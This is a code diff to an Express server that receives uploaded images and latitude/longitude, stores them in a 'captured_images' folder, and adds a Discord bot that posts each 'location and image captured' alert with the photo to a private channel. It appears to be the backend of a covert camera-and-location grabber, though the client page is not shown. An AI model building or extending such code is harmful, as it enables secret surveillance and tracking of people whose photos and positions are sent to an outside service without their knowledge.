@@ -2,11 +2,14 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
+const { Client, Intents } = require('discord.js');
+const { token, channelID } = require('./config.json');  // Import token and channel ID
 
 const app = express();
+const discordClient = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
 
-// Use the PORT from environment variables (Render will set it)
-const PORT = process.env.PORT || 3000;  // Default to 3000 if PORT is not set
+// Server Port
+const PORT = process.env.PORT || 3000;
 
 // Create directories if they don't exist
 if (!fs.existsSync(path.join(__dirname, 'captured_images'))) {
@@ -21,6 +24,14 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // Middleware to parse JSON requests
 app.use(bodyParser.json({ limit: '10mb' }));
+
+// Discord bot ready event
+discordClient.once('ready', () => {
+    console.log('Discord bot is ready!');
+});
+
+// Log in to Discord bot
+discordClient.login(token);
 
 // Route to handle image and location data
 app.post('/upload', (req, res) => {
@@ -49,6 +60,17 @@ app.post('/upload', (req, res) => {
             if (err) {
                 return res.status(500).json({ message: 'Error saving location data.' });
             }
+
+            // Send the message to Discord with location info and image
+            const message = `New location and image captured!\nLatitude: ${latitude}, Longitude: ${longitude}`;
+            
+            discordClient.channels.fetch(channelID)  // Use your channel ID here
+                .then(channel => {
+                    channel.send(message);
+                    channel.send({ files: [imagePath] });  // Sends the captured image
+                })
+                .catch(console.error);
+
             res.status(200).json({ message: 'Image and location saved successfully!', latitude, longitude });
         });
     });
